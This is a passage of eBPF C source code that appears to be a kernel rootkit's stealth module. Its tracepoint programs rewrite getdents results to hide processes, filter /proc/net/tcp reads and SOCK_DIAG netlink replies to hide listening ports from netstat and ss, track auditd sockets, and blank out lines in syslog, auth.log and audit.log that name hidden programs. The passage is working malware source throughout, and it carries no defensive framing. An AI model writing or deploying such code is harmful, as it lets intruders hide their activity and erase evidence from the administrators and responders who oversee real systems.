    struct scan_ctx64 s = {
        .dirp = dirp,
        .ret = ret,
        .offset = offset,
        .prev_offset = prev_offset,
        .prev_reclen = prev_reclen,
    };

    bpf_loop(4096, scan64_cb, &s, 0);

    return 0;
}

/*
 * phantom_getdents_enter - sys_enter_getdents: cache dirp for proc hide.
 */
SEC("tracepoint/syscalls/sys_enter_getdents")
int phantom_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PROCESS_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    void *dirent = (void *)ctx->args[1];
    if (!dirent)
        return 0;

    struct getdents_data data = {};
    data.dirp = (__u64)dirent;
    bpf_map_update_elem(&getdents_cache_procs, &tid, &data, BPF_ANY);
    return 0;
}

/*
 * phantom_getdents_exit - sys_exit_getdents: hide /proc entries (scan32_cb).
 */
SEC("tracepoint/syscalls/sys_exit_getdents")
int phantom_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PROCESS_HIDING))
        return 0;

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    struct getdents_data *data = bpf_map_lookup_elem(&getdents_cache_procs, &tid);
    if (!data)
        return 0;

    __u64 dirp = data->dirp;
    bpf_map_delete_elem(&getdents_cache_procs, &tid);

    struct scan_ctx32 s = {
        .dirp = dirp,
        .ret = ret,
        .offset = 0,
        .prev_offset = 0,
        .prev_reclen = 0,
    };

    /* up to 4096 dentries per /proc read */
    bpf_loop(4096, scan32_cb, &s, 0);

    return 0;
}

// /proc/net/tcp and SOCK_DIAG port hiding
// ============================================================
//
// tcp4_seq_show/tcp6_seq_show are often not kprobe-able. Filter read(2)
// on tracked /proc/net/tcp* fds and recvmsg on SOCK_DIAG sockets instead.
//
/*
 * Port hiding paths:
 *   /proc/net/tcp, /proc/net/tcp6 via openat + read
 *   SOCK_DIAG netlink via socket + recvmsg (ss)
 */

/*
 * tracked_proc_tcp_fds - File descriptors that point to /proc/net/tcp.
 *
 * When a process opens /proc/net/tcp or /proc/net/tcp6, track
 * its file descriptor for read interception.
 *
 * Key: (pid << 32) | fd
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_proc_tcp_fds SEC(".maps");

/*
 * port_read_ctx - Context for a read() syscall on a tracked fd.
 *
 * Saves the buffer pointer and fd so the buffer can be modified at read exit.
 */
struct port_read_ctx {
    void *buf;
    __u32 fd;
};

/*
 * port_read_enter_cache - Cache of read() syscall arguments.
 * Key: Thread ID (tid)
 * Value: The buffer pointer and fd from the read() entry
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} port_read_enter_cache SEC(".maps");

/*
 * file_filter_read_enter_cache - Dedicated cache for file filter read() entry.
 * Separate from port_read_enter_cache to avoid collisions when both
 * port hiding and file filtering are enabled simultaneously.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} file_filter_read_enter_cache SEC(".maps");

/*
 * port_open_pending - Tracks pending openat() calls for /proc/net/tcp.
 *
 * When openat() is called with a path like /proc/net/tcp, set
 * a flag here. When openat() exits successfully, the fd
 * is added to tracked_proc_tcp_fds.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, __u8);
} port_open_pending SEC(".maps");

/*
 * tracked_sock_diag_fds - SOCK_DIAG socket fds (used by `ss` command).
 *
 * The `ss` command uses netlink SOCK_DIAG messages instead of reading
 * /proc/net/tcp. Track these socket fds to filter their responses.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_sock_diag_fds SEC(".maps");

/*
 * tracked_audit_fds - Audit netlink socket fds (used by auditd).
 *
 * auditd receives audit records via AF_NETLINK + NETLINK_AUDIT sockets.
 * Track these fds to filter out audit records for hidden PIDs.
 * Key: (PID << 32) | fd
 * Value: 1 (presence means tracked)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_audit_fds SEC(".maps");

/*
 * tracked_proc_dev_fds - File descriptors for /proc/net/dev.
 * ifconfig reads this to enumerate interfaces.
 * Key: (PID << 32) | fd
 * Value: 1 (presence means tracked)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_proc_dev_fds SEC(".maps");

/*
 * dev_open_pending - Tracks pending openat() calls for /proc/net/dev.
 * Key: Thread ID (tid)
 * Value: 1 (presence means pending)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} dev_open_pending SEC(".maps");

/*
 * dev_read_enter_cache - Cache for /proc/net/dev read() entry.
 * Key: Thread ID (tid)
 * Value: buffer pointer and fd
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} dev_read_enter_cache SEC(".maps");

/*
 * tracked_syslog_fds - File descriptors for syslog files.
 *
 * When a process opens /var/log/syslog, /var/log/auth.log,
 * /var/log/messages, or /var/log/audit/audit.log, track the fd
 * to filter read() calls and suppress lines mentioning hidden
 * process names.
 * Key: (PID << 32) | fd
 * Value: 1 (presence means tracked)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_syslog_fds SEC(".maps");

/*
 * syslog_open_pending - Tracks pending openat() calls for syslog files.
 * Key: Thread ID (tid)
 * Value: 1 (presence means pending)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} syslog_open_pending SEC(".maps");

/*
 * socket_enter_data - Arguments from the socket() syscall entry.
 *
 * Saves the domain (AF_INET, AF_INET6, etc.) and protocol to check
 * if this is an AF_NETLINK + NETLINK_SOCK_DIAG socket (used by `ss`).
 */
struct socket_enter_data {
    __u32 domain;
    __u32 protocol;
};

/*
 * socket_enter_cache - Cache of socket() syscall arguments.
 * Key: Thread ID (tid)
 * Value: The domain and protocol from socket() entry
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct socket_enter_data);
} socket_enter_cache SEC(".maps");

/*
 * recvmsg_enter_cache - Cache of recvmsg() syscall arguments.
 * Used for SOCK_DIAG filtering (the `ss` command path).
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} recvmsg_enter_cache SEC(".maps");

/*
 * route_recvmsg_enter_cache - Dedicated cache for NETLINK_ROUTE recvmsg entry.
 * Separate from recvmsg_enter_cache to avoid races when multiple
 * recvmsg exit programs fire on the same tracepoint.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} route_recvmsg_enter_cache SEC(".maps");

/*
 * packet_recvmsg_enter_cache - Dedicated cache for AF_PACKET recvmsg entry.
 * Separate from recvmsg_enter_cache to avoid races.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct port_read_ctx);
} packet_recvmsg_enter_cache SEC(".maps");

/*
 * ioctl_ifconf_data - Saved SIOCGIFCONF ioctl arguments.
 */
struct ioctl_ifconf_data {
    void *ifconf_ptr; /* pointer to struct ifconf in userspace */
    void *buf;        /* userspace ifc_buf pointer */
    __u32 maxlen;     /* original ifc_len (max buffer size) */
    __u32 padding;
};

/*
 * ioctl_enter_cache - Cache of ioctl() syscall arguments for SIOCGIFCONF.
 * Key: Thread ID (tid)
 * Value: Saved ifconf buffer pointer and max length
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, struct ioctl_ifconf_data);
} ioctl_enter_cache SEC(".maps");

/*
 * port_filter_scratch - Per-CPU scratch buffer for port filtering.
 *
 * Copies the read buffer to kernel space for processing.
 * 4KB per-CPU buffer used as the kernel-side copy.
 */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[4096]);
} port_filter_scratch SEC(".maps");

/*
 * route_filter_scratch - Per-CPU scratch buffer for NETLINK_ROUTE filtering.
 *
 * NETLINK_ROUTE responses (ip a) can be 8-16KB due to per-interface
 * stats and bridge data. Dedicated larger buffer to handle these.
 */
#define ROUTE_FILTER_MAX 16384
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[16384]);
} route_filter_scratch SEC(".maps");

/* Port filtering constants */
#define PORT_FILTER_MAX 4096

/* /proc/net/tcp line length */
#define PORT_LINE_MAX   160

/* AF_NETLINK socket domain */
#define AF_NETLINK          16

/* NETLINK_SOCK_DIAG socket protocol.*/
#define NETLINK_SOCK_DIAG   4
#define NETLINK_AUDIT       9
#define SOCK_DIAG_SPORT_OFF 20

/* NLMSG_ALIGN - Align a length to a multiple of 4 */
#define NLMSG_ALIGN(len)    (((len) + 3) & ~3)
#define MAX_NLMSG           128

/* NLMSG_FILTER_ITERS - Number of iterations for NLMSG filtering */
#define NLMSG_FILTER_ITERS  512

#define NETLINK_ROUTE       0


#define AF_PACKET           17

/* ioctl SIOCGIFCONF for ifconfig interface listing */
#define SIOCGIFCONF         0x8912

/* Netlink route attribute header size */
#define RTA_HDR_LEN         4
#define RTA_ALIGNTO         4

/* RTA_OK - Check if a netlink route attribute is valid */
#define RTA_OK(rta, len)    ((len) >= RTA_HDR_LEN && \
                             (rta)->rta_len >= RTA_HDR_LEN && \
                             (rta)->rta_len <= (len))

/* RTA_NEXT - Get the next netlink route attribute */
#define RTA_NEXT(rta, attrlen) ((attrlen) -= RTA_ALIGN((rta)->rta_len), \
                                (struct rtattr *)((char *)(rta) + RTA_ALIGN((rta)->rta_len)))

/* RTA_LENGTH - Get the length of a netlink route attribute */
#define RTA_LENGTH(len)     (RTA_HDR_LEN + (len))

/* RTA_ALIGN - Align a length to a multiple of RTA_ALIGNTO */
#define RTA_ALIGN(len)      (((len) + RTA_ALIGNTO - 1) & ~(RTA_ALIGNTO - 1))

/* RTA_DATA - Get the data of a netlink route attribute */
#define RTA_DATA(rta)       ((void *)((char *)(rta) + RTA_HDR_LEN))

/* Netlink route message types */
#define RTM_NEWLINK         16
#define RTM_NEWADDR         20

/* Interface attribute types */
#define IFLA_IFNAME         3

/* Address attribute types */
#define IFA_ADDRESS         1

/* Packet header sizes */
#define ETH_HDR_LEN         14
#define IP_HDR_MIN_LEN      20

/* struct rtattr is already defined in vmlinux.h */

/*
 * should_hide_port_from_current - True unless target_ppid filters this process out.
 *
 * CO-RE: reads real_parent.tgid (field name varies by kernel).
 */
static __always_inline int should_hide_port_from_current(void)
{
    __u32 key = 0;
    __u32 *want_ppid = bpf_map_lookup_elem(&target_ppid, &key);
    if (!want_ppid || *want_ppid == 0)
        return 1;  /* target_ppid unset: hide for all */

    /* Read the current process's parent PID from the kernel */
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    __u32 ppid = BPF_CORE_READ(task, real_parent, tgid);
    return ppid == *want_ppid;
}

/*
 * str_eq_n - Compare two strings for equality up to n bytes.
 *
 * #pragma unroll; max n is 24 (/var/log/audit/audit.log suffix check).
 */
static __always_inline int str_eq_n(const char *a, const char *b, int n)
{
    for (int i = 0; i < 24; i++) {
        if (i >= n)
            break;
        if (a[i] != b[i])
            return 0;
    }
    return 1;
}

/*
 * path_is_proc_net_tcp - True for /proc/net/tcp, tcp6, or /proc/self/net variants.
 */
static __always_inline int path_is_proc_net_tcp(const char *path, int len)
{
    if (len >= 19 && str_eq_n(path + len - 19, "/proc/self/net/tcp6", 19))
        return 1;
    if (len >= 18 && str_eq_n(path + len - 18, "/proc/self/net/tcp", 18))
        return 1;
    if (len >= 14 && str_eq_n(path + len - 14, "/proc/net/tcp6", 14))
        return 1;
    if (len >= 13 && str_eq_n(path + len - 13, "/proc/net/tcp", 13))
        return 1;
    return 0;
}

/*
 * path_is_syslog - True for /var/log/syslog, auth.log, messages, audit.log.
 */
static __always_inline int path_is_syslog(const char *path, int len)
{
    if (len >= 15 && str_eq_n(path + len - 15, "/var/log/syslog", 15))
        return 1;
    if (len >= 17 && str_eq_n(path + len - 17, "/var/log/messages", 17))
        return 1;
    if (len >= 17 && str_eq_n(path + len - 17, "/var/log/auth.log", 17))
        return 1;
    if (len >= 24 && str_eq_n(path + len - 24, "/var/log/audit/audit.log", 24))
        return 1;
    return 0;
}

/*
 * path_is_proc_net_dev - True for /proc/net/dev or /proc/self/net/dev.
 */
static __always_inline int path_is_proc_net_dev(const char *path, int len)
{
    if (len >= 18 && str_eq_n(path + len - 18, "/proc/self/net/dev", 18))
        return 1;
    if (len >= 13 && str_eq_n(path + len - 13, "/proc/net/dev", 13))
        return 1;
    return 0;
}

/*
 * syslog_name_scan_ctx - State for sliding-window name lookup in a log line.
 */
struct syslog_name_scan_ctx {
    const char *line;
    __u32 line_len;
    int result;
};

/*
 * syslog_name_scan_cb - bpf_loop: try 2..15 char prefixes at offset i.
 *
 * Returns: 1 on match or past line end, 0 otherwise
 */
static long syslog_name_scan_cb(__u32 i, void *ctxp)
{
    struct syslog_name_scan_ctx *c = ctxp;
    if (i >= c->line_len)
        return 1;

    /* Read up to 16 bytes starting at this position */
    char chunk[16];
    __builtin_memset(chunk, 0, sizeof(chunk));
    __u32 chunk_len = c->line_len - i;
    if (chunk_len > 15)
        chunk_len = 15;
    if (bpf_probe_read_kernel(chunk, chunk_len, c->line + i) < 0)
        return 0;

    /* Check each null-terminated prefix against hidden_exec_names */
    for (__u32 j = 2; j <= 15; j++) {
        if (j > chunk_len)
            break;
        chunk[j] = '\0';
        __u8 *found = bpf_map_lookup_elem(&hidden_exec_names, chunk);
        if (found) {
            c->result = 1;
            return 1;
        }
    }
    return 0;
}

/*
 * syslog_line_has_hidden_name - Sliding-window match against hidden_exec_names.
 */
static __noinline int syslog_line_has_hidden_name(const char *line, __u32 line_len)
{
    struct syslog_name_scan_ctx ctx = {
        .line = line,
        .line_len = line_len,
        .result = 0,
    };
    bpf_loop(64, syslog_name_scan_cb, &ctx, 0);
    return ctx.result;
}

/*
 * parse_hex4 - Parse four hex digits (e.g. "115C" -> 0x115c).
 */
static __noinline __u32 parse_hex4(const char *s)
{
    __u32 v = 0;
    #pragma unroll
    for (int i = 0; i < 4; i++) {
        char c = s[i];
        __u32 d = 0;
        if (c >= '0' && c <= '9')
            d = c - '0';
        else if (c >= 'A' && c <= 'F')
            d = c - 'A' + 10;
        else if (c >= 'a' && c <= 'f')
            d = c - 'a' + 10;
        else
            return 0;
        v = (v << 4) | d;
    }
    return v;
}

/*
 * is_hex8_at - True if eight hex digits start at off (IPv4 field in proc line).
 */
static __noinline int is_hex8_at(const char *line, __u32 off, __u32 len)
{
    if (off + 8 > len || off + 8 > PORT_LINE_MAX)
        return 0;

    #pragma unroll
    for (int i = 0; i < 8; i++) {
        char c = 0;
        if (bpf_probe_read_kernel(&c, sizeof(c), line + off + i) < 0)
            return 0;
        if (!((c >= '0' && c <= '9') ||
              (c >= 'A' && c <= 'F') ||
              (c >= 'a' && c <= 'f')))
            return 0;
    }
    return 1;
}

/* /proc/net/tcp6 local_address: 32 hex nibbles before port colon */
/*
 * is_hex32_at - True if 32 hex digits start at off (IPv6 local address).
 */
static __noinline int is_hex32_at(const char *line, __u32 off, __u32 len)
{
    if (off + 32 > len || off + 32 > PORT_LINE_MAX)
        return 0;

    #pragma unroll
    for (int i = 0; i < 32; i++) {
        char c = 0;
        if (bpf_probe_read_kernel(&c, sizeof(c), line + off + i) < 0)
            return 0;
        if (!((c >= '0' && c <= '9') ||
              (c >= 'A' && c <= 'F') ||
              (c >= 'a' && c <= 'f')))
            return 0;
    }
    return 1;
}

/*
 * check_local_port_at - True if colon_off points at a hidden local port.
 *
 * Validates ip_hex_len hex digits before colon, then reads 4-digit hex port.
 * ip_hex_len: 8 (IPv4) or 32 (IPv6). Sets *port_out when hidden.
 */
static __noinline int check_local_port_at(const char *line, __u32 colon_off, __u32 len,
                                          __u32 ip_hex_len, __u32 *port_out)
{
    if (colon_off < ip_hex_len || colon_off + 5 > len ||
        colon_off + 5 > PORT_LINE_MAX)
        return 0;

    /* Validate the IP address hex digits before the colon */
    if (ip_hex_len == 8) {
        if (!is_hex8_at(line, colon_off - 8, len))
            return 0;
    } else if (ip_hex_len == 32) {
        if (!is_hex32_at(line, colon_off - 32, len))
            return 0;
    } else {
        return 0;
    }

    /* Verify there's a colon at the expected position */
    char colon = 0;
    if (bpf_probe_read_kernel(&colon, sizeof(colon), line + colon_off) < 0)
        return 0;
    if (colon != ':')
        return 0;

    /* Read and parse the 4-character hex port number */
    char hex[4];
    if (bpf_probe_read_kernel(hex, sizeof(hex), line + colon_off + 1) < 0)
        return 0;

    __u32 port = parse_hex4(hex);
    if (!port_is_hidden(port))
        return 0;

    if (port_out)
        *port_out = port;
    return 1;
}

/*
 * line_has_hidden_local_port - True if proc/tcp line local port is hidden.
 *
 * Parses the first local_address field only (listener port).
 */
static __noinline int line_has_hidden_local_port(const char *line, __u32 len, __u32 *port_out)
{
    __u32 i = 0;
    __u32 colon_off = 0;
    int found_sl_colon = 0;

    /* Skip leading whitespace (spaces and tabs) */
    #pragma unroll
    for (int k = 0; k < 16; k++) {
        if (i >= len || i >= PORT_LINE_MAX)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, sizeof(c), line + i) < 0)
            break;
        if (c == ' ' || c == '\t') {
            i++;
            continue;
        }
        break;
    }

    /* Find the slot number and colon (e.g., "0:" at the start of a line) */
    #pragma unroll
    for (int k = 0; k < 16; k++) {
        if (i >= len || i >= PORT_LINE_MAX)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, sizeof(c), line + i) < 0)
            break;
        if (c == ':') {
            found_sl_colon = 1;
            i++;
            break;
        }
        if (c >= '0' && c <= '9') {
            i++;
            continue;
        }
        break;
    }

    if (!found_sl_colon)
        return 0;

    /* Skip whitespace between slot number and IP address */
    #pragma unroll
    for (int k = 0; k < 8; k++) {
        if (i >= len || i >= PORT_LINE_MAX)
            break;
        char c = 0;
        if (bpf_probe_read_kernel(&c, sizeof(c), line + i) < 0)
            break;
        if (c == ' ' || c == '\t') {
            i++;
            continue;
        }
        break;
    }

    /* IPv4 /proc/net/tcp: 8 hex digit local IP, then colon, then port */
    colon_off = i + 8;
    if (check_local_port_at(line, colon_off, len, 8, port_out))
        return 1;

    /* IPv6 /proc/net/tcp6: 32 hex digit local address (e.g. [::]:8090) */
    colon_off = i + 32;
    return check_local_port_at(line, colon_off, len, 32, port_out);
}

/*
 * blank_line_ctx / blank_line_cb / blank_port_line - Overwrite a line with spaces.
 *
 * Spaces preserve line length; NUL would truncate in some parsers.
 */
struct blank_line_ctx {
    void *ubuf;
    __u32 line_start;
    __u32 line_len;
};

/* blank_line_cb - bpf_loop: write one space at offset i */
static long blank_line_cb(__u32 i, void *ctxp)
{
    struct blank_line_ctx *c = ctxp;
    if (i >= c->line_len)
        return 1;
    char sp = ' ';
    bpf_probe_write_user((char *)c->ubuf + c->line_start + i, &sp, sizeof(sp));
    return 0;
}

static __noinline void blank_port_line(void *ubuf, __u32 line_start, __u32 line_len)
{
    struct blank_line_ctx ctx = {
        .ubuf = ubuf,
        .line_start = line_start,
        .line_len = line_len,
    };
    bpf_loop(PORT_LINE_MAX, blank_line_cb, &ctx, 0);
}

/*
 * port_scan_ctx - Line-by-line scan of a /proc/net/tcp read buffer.
 */
struct port_scan_ctx {
    char *scratch;
    void *ubuf;
    __u32 n;
    __u32 line_start;
};

/*
 * port_scan_cb - bpf_loop: blank lines whose local port is hidden.
 */
static long port_scan_cb(__u32 i, void *ctxp)
{
    struct port_scan_ctx *c = ctxp;
    __u32 idx = i;

    if (idx >= PORT_FILTER_MAX)
        return 1;

    /* Clamp idx for map lookup bounds */
    idx &= (PORT_FILTER_MAX - 1);

    __u32 n = c->n;
    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    if (idx >= n)
        return 1;

    /* Read one byte from the scratch buffer */
    char ch = 0;
    if (bpf_probe_read_kernel(&ch, sizeof(ch), c->scratch + idx) < 0)
        return 0;

    __u32 last = n - 1;

    /* End of line or buffer */
    if (ch != '\n' && idx != last)
        return 0;

    __u32 line_start = c->line_start & (PORT_FILTER_MAX - 1);
    __u32 line_len = idx - line_start + 1;

    if (line_len > 0 && line_len <= PORT_LINE_MAX &&
        line_start < PORT_FILTER_MAX &&
        line_start + line_len <= n) {
        __u32 hidden_port = 0;
        if (line_has_hidden_local_port(c->scratch + line_start, line_len, &hidden_port)) {
            emit_hide_event_port(hidden_port, "proc_tcp");
            blank_port_line(c->ubuf, line_start, line_len);
        }
    }

    c->line_start = idx + 1;
    return 0;
}

/*
 * diag_msg_hide_sport - True if SOCK_DIAG message sport (offset 20) is hidden.
 */
static __noinline int diag_msg_hide_sport(const char *buf, __u32 msg_off, __u32 n,
                                          __u32 *port_out)
{
    if (msg_off + SOCK_DIAG_SPORT_OFF + 2 > n)
        return 0;

    /* Read the source port (2 bytes, network byte order) */
    __be16 sport = 0;
    if (bpf_probe_read_kernel(&sport, sizeof(sport),
                              buf + msg_off + SOCK_DIAG_SPORT_OFF) < 0)
        return 0;

    /* Convert from network byte order (big-endian) to host byte order */
    __u32 port = bpf_ntohs(sport);
    if (!port_is_hidden(port))
        return 0;

    if (port_out)
        *port_out = port;
    return 1;
}

/*
 * copy_nlmsg_to_user - Copy one netlink message to userspace byte-by-byte.
 *
 * len capped at MAX_NLMSG (no bulk user memcpy helper).
 */
struct copy_nlmsg_ctx {
    void *ubuf;
    __u32 dst;
    const char *src;
    __u32 src_off;
    __u32 len;
};

/* copy_nlmsg_cb - bpf_loop: copy one byte scratch -> ubuf */
static long copy_nlmsg_cb(__u32 i, void *ctxp)
{
    struct copy_nlmsg_ctx *c = ctxp;
    if (i >= c->len)
        return 1;
    char ch = 0;
    if (bpf_probe_read_kernel(&ch, 1, c->src + c->src_off + i) < 0)
        return 1;
    bpf_probe_write_user((char *)c->ubuf + c->dst + i, &ch, sizeof(ch));
    return 0;
}

static __noinline void copy_nlmsg_to_user(void *ubuf, __u32 dst, const char *src,
                                          __u32 src_off, __u32 len)
{
    if (len > MAX_NLMSG)
        len = MAX_NLMSG;
    struct copy_nlmsg_ctx ctx = {
        .ubuf = ubuf, .dst = dst,
        .src = src, .src_off = src_off, .len = len,
    };
    bpf_loop(MAX_NLMSG, copy_nlmsg_cb, &ctx, 0);
}

/*
 * zero_user_range - Zero ubuf[from..to) after compacting a filtered buffer.
 */
static __noinline void zero_user_range(void *ubuf, __u32 from, __u32 to)
{
    char z = 0;

    if (from >= to || to > PORT_FILTER_MAX)
        return;

    #pragma unroll
    for (__u32 i = 0; i < PORT_FILTER_MAX; i++) {
        __u32 pos = from + i;
        if (pos >= to)
            break;
        bpf_probe_write_user((char *)ubuf + pos, &z, sizeof(z));
    }
}

/*
 * nl_filter_ctx - Compact a netlink recvmsg buffer in kernel scratch.
 */
struct nl_filter_ctx {
    char *scratch;
    void *ubuf;
    __u32 n;
    __u32 in_off;
    __u32 out_off;
    __u8 done;
};

/*
 * nlmsg_filter_cb - Drop SOCK_DIAG messages with hidden sport; pack the rest.
 */
static long nlmsg_filter_cb(__u32 i, void *ctxp)
{
    struct nl_filter_ctx *c = ctxp;

    (void)i;
    if (c->done || c->in_off >= c->n)
        return 1;

    /* Read the message length (first 4 bytes of a netlink message) */
    __u32 len = 0;
    if (bpf_probe_read_kernel(&len, 4, c->scratch + c->in_off) < 0) {
        c->done = 1;
        return 1;
    }

    /* Validate the message length */
    if (len < 16 || c->in_off + len > c->n) {
        c->done = 1;
        return 1;
    }

    /* Check if this message contains a hidden port */
    __u32 hidden_port = 0;
    if (diag_msg_hide_sport(c->scratch, c->in_off, c->n, &hidden_port)) {
        /* Hidden: omit message */
        emit_hide_event_port(hidden_port, "sock_diag");
    } else {
        /* Keep: copy to compacted offset */
        copy_nlmsg_to_user(c->ubuf, c->out_off, c->scratch, c->in_off, len);
        c->out_off += len;
    }

    /* Advance to the next message (netlink messages are 4-byte aligned) */
    c->in_off += NLMSG_ALIGN(len);
    return 0;
}

/*
 * filter_sock_diag_user_buf - Compact SOCK_DIAG recvmsg buffer; return new length.
 */
static __noinline __u32 filter_sock_diag_user_buf(void *ubuf, __u32 n)
{
    if (n == 0 || n > PORT_FILTER_MAX)
        return n;

    /* Get the per-CPU scratch buffer for kernel-side processing */
    __u32 key = 0;
    char *scratch = bpf_map_lookup_elem(&port_filter_scratch, &key);
    if (!scratch)
        return n;

    /* Copy the userspace buffer to kernel space */
    if (bpf_probe_read_user(scratch, n, ubuf) < 0)
        return n;

    /* Filter out messages for hidden ports */
    struct nl_filter_ctx ctx = {
        .scratch = scratch,
        .ubuf = ubuf,
        .n = n,
        .in_off = 0,
        .out_off = 0,
        .done = 0,
    };

    bpf_loop(NLMSG_FILTER_ITERS, nlmsg_filter_cb, &ctx, 0);

    /* Zero out leftover data at the end of the buffer */
    if (ctx.out_off < n)
        zero_user_range(ubuf, ctx.out_off, n);
    return ctx.out_off;
}

/*
 * syslog_scan_cb - Blank syslog lines that match hidden_exec_names.
 */
static long syslog_scan_cb(__u32 i, void *ctxp)
{
    struct port_scan_ctx *c = ctxp;
    __u32 idx = i;

    if (idx >= PORT_FILTER_MAX)
        return 1;

    idx &= (PORT_FILTER_MAX - 1);

    __u32 n = c->n;
    if (n > PORT_FILTER_MAX)
        n = PORT_FILTER_MAX;

    if (idx >= n)
        return 1;

    char ch = 0;
    if (bpf_probe_read_kernel(&ch, sizeof(ch), c->scratch + idx) < 0)
        return 0;

    __u32 last = n - 1;

    /* Process a line when a newline is hit or the end is reached */
    if (ch != '\n' && idx != last)
        return 0;

    __u32 line_start = c->line_start & (PORT_FILTER_MAX - 1);
    __u32 line_len = idx - line_start + 1;

    if (line_len > 0 && line_len <= PORT_LINE_MAX &&
        line_start < PORT_FILTER_MAX &&
        line_start + line_len <= n) {
        if (syslog_line_has_hidden_name(c->scratch + line_start, line_len)) {
            blank_port_line(c->ubuf, line_start, line_len);
        }
    }

    c->line_start = idx + 1;
    return 0;
}

/*
 * phantom_openat_enter - sys_enter_openat: mark pending port/syslog opens.
 */
SEC("tracepoint/syscalls/sys_enter_openat")
int phantom_openat_enter(struct trace_event_raw_sys_enter *ctx)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int syslog_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    if (!port_hiding && !syslog_filter)
        return 0;

    /* Read the file path from userspace */
    const void *path = (const void *)ctx->args[1];
    char *buf = get_str_buf();
    if (!buf)
        return 0;

    long n = bpf_probe_read_user_str(buf, 256, path);
    if (n <= 0)
        return 0;

    /* Find the length of the path string */
    int len = 0;
    #pragma unroll
    for (int i = 0; i < 255; i++) {
        if (buf[i] == '\0') {
            len = i;
            break;
        }
    }

    /*
     * Cap len so str_eq_n suffix checks stay inside the 256-byte str_buf
     * (furthest read: buf[231] when len=232 and suffix len=24).
     */
    if (len > 232)
        len = 232;

    __u64 tid = bpf_get_current_pid_tgid();
    __u8 one = 1;

    /* Check if this is a /proc/net/tcp file */
    if (port_hiding && path_is_proc_net_tcp(buf, len)) {
        bpf_map_update_elem(&port_open_pending, &tid, &one, BPF_ANY);
    }

    /* Check if this is a syslog file */
    if (syslog_filter && path_is_syslog(buf, len)) {
        bpf_map_update_elem(&syslog_open_pending, &tid, &one, BPF_ANY);
    }

    return 0;
}

/*
 * phantom_openat_exit - sys_exit_openat: track fd for port/syslog reads.
 */
SEC("tracepoint/syscalls/sys_exit_openat")
int phantom_openat_exit(struct trace_event_raw_sys_exit *ctx)
{
    int port_hiding = is_config_enabled(CFG_ENABLE_PORT_HIDING);
    int syslog_filter = is_config_enabled(CFG_ENABLE_EXEC_HIDING);
    if (!port_hiding && !syslog_filter)
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    long fd = ctx->ret;
    if (fd < 0)
        return 0;

    __u64 pid = tid >> 32;
    __u64 fdkey = (pid << 32) | ((__u32)fd);
    __u8 one = 1;

    /* Track /proc/net/tcp fds for port hiding */
    __u8 *pending_port = bpf_map_lookup_elem(&port_open_pending, &tid);
    if (pending_port) {
        bpf_map_delete_elem(&port_open_pending, &tid);
        bpf_map_update_elem(&tracked_proc_tcp_fds, &fdkey, &one, BPF_ANY);
    }

    /* Track syslog fds for log filtering */
    __u8 *pending_syslog = bpf_map_lookup_elem(&syslog_open_pending, &tid);
    if (pending_syslog) {
        bpf_map_delete_elem(&syslog_open_pending, &tid);
        bpf_map_update_elem(&tracked_syslog_fds, &fdkey, &one, BPF_ANY);
    }

    return 0;
}

/*
 * Dedicated openat hooks for /proc/net/dev (interface hiding for ifconfig).
 * Separate SEC from main openat hooks.
 */

SEC("tracepoint/syscalls/sys_enter_openat")
int phantom_openat_enter_dev(struct trace_event_raw_sys_enter *ctx)
{
